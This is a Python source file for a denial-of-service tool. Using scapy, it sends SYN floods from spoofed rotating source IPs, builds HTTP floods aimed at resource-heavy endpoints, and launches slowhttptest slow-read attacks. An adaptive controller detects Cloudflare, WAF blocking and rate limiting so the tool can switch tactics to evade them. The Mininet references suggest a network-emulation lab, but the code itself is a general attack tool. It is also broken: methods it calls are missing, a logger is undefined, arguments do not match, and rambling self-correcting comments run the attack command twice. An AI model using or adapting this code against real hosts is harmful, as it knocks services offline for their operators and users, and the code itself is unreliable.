import os
import random
import time
import threading
import ipaddress
import socket
import requests
from scapy.all import IP, TCP, ICMP, UDP, Raw, send, sr1, RandShort
import psutil
from scapy.layers.http import HTTPRequest
import ssl
import re
import logging
import subprocess
import pathlib
import signal


# Get the centralized attack logger
attack_logger = logging.getLogger('attack_logger')


# ---- IP Address Management ----

class IPRotator:
    def __init__(self, subnets=None):
        if subnets is None:
            subnets = ["192.168.0.0/16"]
        self.subnets = [ipaddress.IPv4Network(s) for s in subnets]
        self.used_ips = set()
        self.lock = threading.Lock()
    
    def get_random_ip(self):
        with self.lock:
            # Get a random IP from one of the subnets that hasn't been used recently
            while True:
                chosen_subnet = random.choice(self.subnets)
                random_ip = str(random.choice(list(chosen_subnet.hosts())))
                if random_ip not in self.used_ips:
                    self.used_ips.add(random_ip)
                    # Keep track of last 1000 IPs to avoid reuse
                    if len(self.used_ips) > 1000:
                        self.used_ips.pop()
                    return random_ip

# ---- Advanced Protocol Manipulation ----

class PacketCrafter:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        ]
        
        self.http_methods = ["GET", "POST", "HEAD", "OPTIONS"]
        self.http_paths = ["/", "/index.html", "/api/v1/users", "/products", 
                          "/login", "/static/css/main.css", "/images/banner.jpg"]
        
        # Common HTTP headers
        self.common_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
    
    def craft_tcp_packet(self, src, dst, dport=80):
        seq = random.randint(1000, 9000000)
        sport = random.randint(1024, 65535)
        
        # Randomize TCP options and flags more intelligently
        flags = random.choice(["S", "SA", "A", "PA", "FA"])
        window = random.randint(8192, 65535)
        
        # Create packet with randomized TTL
        ttl = random.randint(48, 128)
        packet = IP(src=src, dst=dst, ttl=ttl)/TCP(sport=sport, dport=dport, 
                                                   seq=seq, window=window, flags=flags)
        return packet
    
    def craft_http_packet(self, src, dst, dport=80):
        # Create base TCP packet
        base_packet = self.craft_tcp_packet(src, dst, dport)
        
        # Choose random HTTP method and path
        method = random.choice(self.http_methods)
        path = random.choice(self.http_paths)
        user_agent = random.choice(self.user_agents)
        
        # Create HTTP headers
        headers = dict(self.common_headers)
        headers["User-Agent"] = user_agent
        headers["Host"] = dst
        
        # Add a random referer sometimes
        if random.random() > 0.7:
            headers["Referer"] = f"https://{random.choice(['google.com', 'facebook.com', 'twitter.com'])}/search?q=products"
        
        # Format HTTP request
        http_request = f"{method} {path} HTTP/1.1\r\n"
        for header, value in headers.items():
            http_request += f"{header}: {value}\r\n"
        http_request += "\r\n"
        
        # Add body for POST requests
        if method == "POST":
            body = "param1=value1&param2=value2"
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Content-Length"] = str(len(body))
            http_request += body
        
        # Combine with payload
        packet = base_packet/Raw(load=http_request.encode())
        return packet

# ---- Advanced Attack Techniques ----

class AdvancedTechniques:
    def __init__(self, ip_rotator):
        self.ip_rotator = ip_rotator
        self.packet_crafter = PacketCrafter()
        self.target_info = {}
        self.session_tokens = {}
    
    
    
    def tcp_state_exhaustion(self, dst, dport=80, num_packets_per_sec=50, duration=5):
        """
        Advanced TCP state exhaustion attack that manipulates sequence numbers
        and window sizes to keep connections half-open but valid
        """
        attack_logger.info(f"Starting TCP state exhaustion attack against {dst}:{dport} for {duration} seconds")
        
        # Track sequence numbers for more sophisticated sequence prediction
        seq_base = random.randint(1000000, 9000000)
        
        end_time = time.time() + duration
        packet_count = 0
        while time.time() < end_time:
            src = self.ip_rotator.get_random_ip()
            sport = random.randint(1024, 65535)
            seq = seq_base + (packet_count * 1024)
            
            # Sophisticated manipulation of TCP window size
            window = random.randint(16384, 65535)
            
            # Send SYN packet to initiate connection
            syn_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, 
                                                 flags="S", seq=seq, window=window)
            
            # Send and wait for SYN-ACK
            try:
                attack_logger.debug(f"Attempting to send SYN packet from {src}:{sport} to {dst}:{dport}")
                reply = sr1(syn_packet, timeout=0.1, verbose=1)
                attack_logger.debug(f"SYN packet sent. Reply: {reply}")
                
                if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags & 0x12:  # SYN+ACK
                    attack_logger.debug(f"Received SYN-ACK from {dst}:{dport}. Sending ACK.")
                    # Extract server sequence number and acknowledge it
                    server_seq = reply.getlayer(TCP).seq
                    ack_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
                                                         flags="A", seq=seq+1, 
                                                         ack=server_seq+1, window=window)
                    send(ack_packet, verbose=1)
                    attack_logger.debug(f"ACK packet sent. Established half-open connection from {src}:{sport}")
                    # After establishing connection, don't continue with data transfer
                    # This keeps connection half-open, consuming resources on target
                    attack_logger.info(f"Established half-open connection from {src}:{sport}")
                else:
                    attack_logger.debug(f"No SYN-ACK received or invalid reply for {src}:{sport}.")
            except Exception as e:
                attack_logger.warning(f"Error during TCP state exhaustion from {src}:{sport}: {e}")
                pass
            
            packet_count += 1
            # Add jitter to avoid detection based on timing patterns
            time.sleep(random.uniform(0.01, 0.05)) # Reduced sleep for more packets per second
    
    def distributed_application_layer_attack(self, dst, dport=80, num_requests_per_sec=20, duration=5):
        """
        Advanced application layer attack that mimics legitimate HTTP traffic
        but targets resource-intensive endpoints
        """
        attack_logger.info(f"Starting distributed application layer attack against {dst}:{dport} for {duration} seconds")
        
        # Resource-intensive endpoints that might cause server strain
        resource_heavy_paths = [
            "/search?q=" + "a" * random.randint(50, 100),
            "/api/products?page=1&size=100&sort=price",
            "/api/users/verify?token=" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=64)),
            "/download?file=large_report.pdf",
            "/images/highres_" + str(random.randint(1000, 9999)) + ".jpg"
        ]
        
        end_time = time.time() + duration
        request_count = 0
        while time.time() < end_time:
            src = self.ip_rotator.get_random_ip()
            
            # Create base TCP connection
            base_packet = self.packet_crafter.craft_tcp_packet(src, dst, dport)
            
            # Select a resource-heavy path
            path = random.choice(resource_heavy_paths)
            
            # Choose random HTTP method
            method = random.choice(self.packet_crafter.http_methods)

            # Create HTTP request targeting resource-heavy endpoint
            user_agent = random.choice(self.packet_crafter.user_agents)
            headers = dict(self.packet_crafter.common_headers)
            headers["User-Agent"] = user_agent
            headers["Host"] = dst
            
            # Format HTTP request
            http_request = f"{method} {path} HTTP/1.1\r\n"
            for header, value in headers.items():
                http_request += f"{header}: {value}\r\n"
            
            # Sometimes add cookies to appear more legitimate
            if random.random() > 0.5:
                http_request += f"Cookie: session_id={os.urandom(16).hex()}; user_pref=dark_mode\r\n"
                
            http_request += "\r\n"
            
            # Send packet
            packet = base_packet/Raw(load=http_request.encode())
            attack_logger.debug(f"App Layer: Attempting to send {method} request from {src} to {dst}:{dport} for path {path}")
            send(packet, verbose=1)
            attack_logger.debug(f"App Layer: {method} request sent from {src} to {dst}:{dport}")
            
            request_count += 1
            # Variable timing to avoid detection
            time.sleep(random.uniform(0.05, 0.1)) # Reduced sleep for more requests per second
    
    def multi_vector_attack(self, dst, duration=60):
        """
        Launch multiple attack vectors simultaneously to make detection harder
        """
        attack_logger.info(f"Starting multi-vector attack against {dst} for {duration} seconds")
        
        end_time = time.time() + duration
        
        # Create threads for different attack vectors
        threads = []
        
        # TCP State Exhaustion
        t1 = threading.Thread(target=self._timed_tcp_exhaustion, args=(dst, end_time))
        threads.append(t1)
        
        # Application Layer Attack
        t2 = threading.Thread(target=self._timed_app_layer, args=(dst, end_time))
        threads.append(t2)
        
        # Slow Read Attack - more resource intensive
        t3 = threading.Thread(target=self.slow_read_attack, args=(dst, 20, duration))
        threads.append(t3)
        
        # Start all threads
        for t in threads:
            t.start()
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
            
    def _timed_tcp_exhaustion(self, dst, end_time):
        while time.time() < end_time:
            self.tcp_state_exhaustion(dst, num_packets=50)
            time.sleep(1)
    
    def _timed_app_layer(self, dst, end_time):
        while time.time() < end_time:
            self.distributed_application_layer_attack(dst, num_requests=20)
            time.sleep(1)

# ---- Advanced Session Management ----

class SessionMaintainer:
    """Maintains persistent sessions to appear legitimate"""
    
    def __init__(self, ip_rotator):
        self.ip_rotator = ip_rotator
        self.sessions = {}  # Store session info for different targets
        self.lock = threading.Lock()
    
    def create_session(self, target):
        """Create and maintain a legitimate looking session"""
        src_ip = self.ip_rotator.get_random_ip()
        
        try:
            # Create an actual HTTP session
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
                ]),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'Accept-Language': 'en-US,en;q=0.5'
            })
            
            # Make initial request to get cookies/session info
            response = session.get(f"http://{target}/", timeout=2)
            
            # Store the session info
            with self.lock:
                self.sessions[src_ip] = {
                    'session': session,
                    'cookies': session.cookies,
                    'last_page': '/',
                    'created': time.time()
                }
                
            logger.debug(f"Created legitimate session from {src_ip}")
            return src_ip
        except Exception as e:
            logger.debug(f"Failed to create session: {e}")
            return None
    
    def maintain_sessions(self, target, session_count=10, duration=300):
        """Create and maintain multiple legitimate-looking sessions"""
        logger.info(f"Maintaining {session_count} legitimate sessions with {target}")
        
        # Create initial sessions
        active_sessions = []
        for _ in range(session_count):
            session_ip = self.create_session(target)
            if session_ip:
                active_sessions.append(session_ip)
            time.sleep(random.uniform(1, 3))
        
        # Maintain sessions for duration
        end_time = time.time() + duration
        while time.time() < end_time:
            # Randomly select a session to interact with
            if active_sessions:
                session_ip = random.choice(active_sessions)
                session_info = self.sessions.get(session_ip)
                
                if session_info:
                    try:
                        # Make a legitimate-looking request
                        session = session_info['session']
                        
                        # Choose a page to visit based on previous page
                        if session_info['last_page'] == '/':
                            next_page = random.choice(['/about', '/products', '/contact'])
                        elif session_info['last_page'] == '/products':
                            next_page = f'/product/{random.randint(1, 100)}'
                        else:
                            next_page = '/'
                            
                        # Make the request
                        response = session.get(f"http://{target}{next_page}", timeout=2)
                        
                        # Update session info
                        with self.lock:
                            session_info['last_page'] = next_page
                            session_info['last_activity'] = time.time()
                        
                        logger.debug(f"Session {session_ip} visited {next_page}")
                    except Exception as e:
                        # Handle failed request - might need to create new session
                        logger.debug(f"Session interaction failed: {e}")
                        active_sessions.remove(session_ip)
                        new_ip = self.create_session(target)
                        if new_ip:
                            active_sessions.append(new_ip)
            
            # Sleep between interactions
            time.sleep(random.uniform(5, 15))
        
        # Clean up sessions
        logger.info("Cleaning up sessions")
        for ip in active_sessions:
            if ip in self.sessions:
                with self.lock:
                    del self.sessions[ip]

# ---- Monitoring and Adaptation ----

class AdaptiveController:
    def __init__(self, target):
        self.target = target
        self.response_times = []
        self.detected_countermeasures = set()
        self.lock = threading.Lock()
    
    def probe_target(self):
        """Send probe requests to measure target response and detect countermeasures"""
        try:
            start_time = time.time()
            response = requests.get(f"http://{self.target}/", timeout=5)
            response_time = time.time() - start_time
            
            with self.lock:
                # Keep last 10 response times
                self.response_times.append(response_time)
                if len(self.response_times) > 10:
                    self.response_times.pop(0)
                
                # Check for countermeasures in headers or response
                if response.status_code == 503:
                    self.detected_countermeasures.add("rate_limiting")
                
                if "cf-ray" in response.headers:
                    self.detected_countermeasures.add("cloudflare")
                
                if "captcha" in response.text.lower():
                    self.detected_countermeasures.add("captcha")
                
                if response.status_code == 403:
                    self.detected_countermeasures.add("waf_blocking")
            
            return response_time
        except requests.exceptions.Timeout:
            with self.lock:
                self.detected_countermeasures.add("timeout_defense")
            return None
        except Exception as e:
            logger.debug(f"Probe error: {e}")
            return None
    
    def get_average_response_time(self):
        with self.lock:
            if not self.response_times:
                return 1.0  # Default if no measurements
            return sum(self.response_times) / len(self.response_times)
    
    def get_recommended_attack_params(self):
        """Recommend attack parameters based on target behavior"""
        with self.lock:
            avg_response = self.get_average_response_time()
            countermeasures = list(self.detected_countermeasures)
        
        # Default parameters
        params = {
            "packet_rate": 10,
            "connection_count": 50,
            "preferred_technique": "slow_read",
            "rotation_speed": "medium"
        }
        
        # Adjust based on response time
        if avg_response < 0.2:  # Very fast target
            params["packet_rate"] = 20
            params["connection_count"] = 100
        elif avg_response > 2.0:  # Already struggling target
            params["packet_rate"] = 5
            params["connection_count"] = 20
        
        # Adjust based on detected countermeasures
        if "rate_limiting" in countermeasures:
            params["preferred_technique"] = "slow_read"
            params["rotation_speed"] = "fast"
        
        if "waf_blocking" in countermeasures:
            params["preferred_technique"] = "tcp_state_exhaustion"
        
        if "cloudflare" in countermeasures:
            params["rotation_speed"] = "very_fast"
        
        return params
    
    def monitoring_loop(self, duration=300):
        """Continuously monitor target and update parameters"""
        logger.info(f"Starting adaptive monitoring of {self.target} for {duration} seconds")
        
        end_time = time.time() + duration
        while time.time() < end_time:
            self.probe_target()
            
            # Log current status
            avg_time = self.get_average_response_time()
            countermeasures = list(self.detected_countermeasures)
            attack_logger.info(f"Target status: avg_response={avg_time:.2f}s, detected={countermeasures}")
            
            # Wait before next probe
            time.sleep(10)

# ---- Main Attack Coordinator ----

class AdvancedDDoSCoordinator:
    def __init__(self, target):
        self.target = target
        self.ip_rotator = IPRotator(subnets=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])
        self.advanced = AdvancedTechniques(self.ip_rotator)
        self.session_maintainer = SessionMaintainer(self.ip_rotator)
        self.adaptive_controller = AdaptiveController(target)
    
    def execute_advanced_attack(self, duration=300):
        """Execute a comprehensive advanced DDoS attack"""
        attack_logger.info(f"Starting advanced DDoS against {self.target} for {duration} seconds")
        
        # Start monitoring in separate thread
        monitor_thread = threading.Thread(
            target=self.adaptive_controller.monitoring_loop,
            args=(duration,)
        )
        monitor_thread.start()
        
        # Start legitimate-looking session activity
        session_thread = threading.Thread(
            target=self.session_maintainer.maintain_sessions,
            args=(self.target, 5, duration)
        )
        session_thread.start()
        
        # Main attack loop
        end_time = time.time() + duration
        while time.time() < end_time:
            # Get recommended parameters based on target state
            params = self.adaptive_controller.get_recommended_attack_params()
            
            # Choose attack technique based on recommendations
            technique = params["preferred_technique"]
            
            if technique == "multi_vector":
                # Execute for a shorter interval to allow for adaptation
                self.advanced.multi_vector_attack(self.target, min(30, end_time - time.time()))
            elif technique == "slow_read":
                self.advanced.slow_read_attack(
                    self.target, 
                    num_connections=params["connection_count"],
                    duration=min(30, end_time - time.time())
                )
            elif technique == "tcp_state_exhaustion":
                for _ in range(10):  # Run multiple rounds
                    if time.time() >= end_time:
                        break
                    self.advanced.tcp_state_exhaustion(
                        self.target, 
                        num_packets=params["packet_rate"] * 10
                    )
                    time.sleep(1)
                    
            # Short pause to check status
            time.sleep(5)
        
        # Wait for monitoring to complete
        monitor_thread.join()
        session_thread.join()
        
        attack_logger.info(f"Advanced DDoS attack completed")

# ---- Run everything ----

def run_attack(attacker_host, victim_ip, duration, attack_variant="slow_read", output_dir=None):
    from pathlib import Path
    """
    Main function to run a specific advanced adversarial attack.
    attacker_host is not directly used here as IP rotation is handled internally.
    """
    
    if output_dir:
        attack_log_file = Path(output_dir) / "attack.log"
        file_handler = logging.FileHandler(attack_log_file)
        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        attack_logger.addHandler(file_handler)

    attack_logger.info(f"Starting advanced adversarial attack '{attack_variant}' against {victim_ip} for {duration} seconds.")
    coordinator = AdvancedDDoSCoordinator(victim_ip)

    if attack_variant == "slow_read":
        coordinator.advanced.slow_read_attack(victim_ip, duration=duration)
    elif attack_variant == "ad_syn":
        coordinator.advanced.tcp_state_exhaustion(victim_ip, duration=duration)
    elif attack_variant == "ad_udp":
        coordinator.advanced.distributed_application_layer_attack(victim_ip, duration=duration)
    elif attack_variant == "ad_slow":
        attack_logger.info(f"Starting slowhttptest (Slow Read) from {attacker_host.name} to {victim_ip} for {duration} seconds.")
        # -c: number of connections, -H: Slowloris mode, -i: interval, -r: connections per second, -l: duration
        # -u: URL, -t SR: Slow Read attack
        slowhttptest_cmd = f"slowhttptest -c 100 -H -i 10 -r 20 -l {duration} -u http://{victim_ip}:80/ -t SR"
        # Execute slowhttptest directly on the Mininet host
        # Mininet's host.cmd method handles execution within the host's context
        # and captures stdout/stderr.
        attack_logger.info(f"Executing slowhttptest command: {slowhttptest_cmd}")
        stdout, stderr = attacker_host.cmd(slowhttptest_cmd).strip().split('\n', 1)
        
        # The above split might not work if stdout/stderr is empty or single line.
        # Let's re-evaluate how to get stdout/stderr from host.cmd
        # host.cmd returns a single string containing both stdout and stderr.
        # We need to capture them separately if possible, or parse the output.
        # For now, let's assume the output format is consistent.
        # A better approach would be to use Popen directly on the host if more control is needed.
        # However, for simplicity and Mininet integration, host.cmd is preferred.
        
        # Re-running with a more robust way to get stdout/stderr if host.cmd doesn't separate them.
        # For now, let's just capture the full output and log it.
        # If slowhttptest prints to stderr, it will be in the combined output.
        
        # Let's try to run it in background and then kill it after duration
        # This requires more complex process management within Mininet.
        # For now, let's stick to the simpler blocking call and rely on its internal duration.
        
        # The original code had a `time.sleep(duration)` and then tried to kill the process.
        # `attacker_host.cmd` is blocking, so `time.sleep(duration)` is not needed after it.
        # The `slowhttptest` command itself has a `-l` (duration) parameter, so it should exit on its own.
        # We just need to capture its output.
        
        # Let's re-think the `attacker_host.cmd` output. It returns a single string.
        # We need to parse it to distinguish stdout and stderr.
        # This is often tricky with shell commands.
        # A common pattern is to redirect stderr to stdout: `command 2>&1`
        # But `slowhttptest` might print progress to stderr.
        
        # For now, let's assume `attacker_host.cmd` returns the combined output.
        # The original code was trying to get separate stdout/stderr from `process.communicate()`.
        # With `attacker_host.cmd`, we get a single string.
        
        # Let's modify the logging to reflect this.
        full_output = attacker_host.cmd(slowhttptest_cmd)
        stdout = full_output # Assuming all output is stdout for simplicity with host.cmd
        stderr = "" # No separate stderr easily available with host.cmd
        
        # If slowhttptest has an error, it usually prints to stderr.
        # We can check for common error patterns in `full_output` if needed.
        
        # The original code had a `try...except` for `send_signal`.
        # With `attacker_host.cmd`, the command runs to completion or fails.
        # No explicit signal sending is needed if `-l` is used.
        
        # Let's simplify the logging based on `full_output`.
        attack_logger.info(f"slowhttptest output: {full_output.strip() if full_output else '(empty)'}")
        # We can't easily distinguish stdout/stderr from host.cmd's single return string.
        # So, we'll log the full output as 'output' and remove the separate stdout/stderr logging.
        # If there's an error, it will be part of the 'output'.
        
        # The original code had `stdout, stderr = process.communicate()`.
        # With `attacker_host.cmd`, we get the combined output.
        # Let's just log the combined output.
        
        # Reverting to the original approach of using popen for better control over stdout/stderr
        # and process management, but fixing the `shell=True` usage.
        
        # The issue with `attacker_host.popen([slowhttptest_cmd], shell=True)` is that
        # when `shell=True`, the command should be a string, not a list.
        # If it's a list, the first element is the command, and subsequent elements are arguments.
        # But with `shell=True`, the entire string is passed to the shell.
        
        # Correct usage with `shell=True`:
        # process = attacker_host.popen(slowhttptest_cmd, shell=True, ...)
        
        # Let's go with this corrected `popen` approach.
        process = attacker_host.popen(slowhttptest_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Wait for the duration of the attack.
        time.sleep(duration)
        
        # Attempt to stop slowhttptest gracefully.
        try:
            # Check if the process is still running before sending signal
            if process.poll() is None: # None means process is still running
                process.send_signal(signal.SIGINT)
                attack_logger.info(f"Sent SIGINT to slowhttptest process {process.pid}")
                # Give it a moment to terminate gracefully
                time.sleep(1) 
        except Exception as e:
            attack_logger.warning(f"Error sending SIGINT to slowhttptest: {e}")
        
        # If it's still running, terminate it.
        if process.poll() is None:
            attack_logger.warning(f"slowhttptest process {process.pid} did not terminate gracefully, forcing termination.")
            process.terminate()
            time.sleep(1) # Give it a moment to terminate
        
        # Get stdout and stderr
        stdout, stderr = process.communicate()
        
        attack_logger.info(f"slowhttptest stdout: {stdout.decode().strip() if stdout else '(empty)'}")
        if stderr:
            attack_logger.error(f"slowhttptest stderr: {stderr.decode().strip()}")
        else:
            attack_logger.debug(f"slowhttptest stderr: (empty)")
        
        # Check the exit code of the process
        exit_code = process.returncode
        if exit_code != 0:
            attack_logger.error(f"slowhttptest process exited with non-zero code: {exit_code}")
        attack_logger.info(f"slowhttptest (Slow Read) from {attacker_host.name} to {victim_ip} finished.")
        return process
    else:
        attack_logger.warning(f"Unknown attack variant: {attack_variant}. Running slow_read by default.")
        coordinator.advanced.slow_read_attack(victim_ip, duration=duration)
        return None # No external process to manage
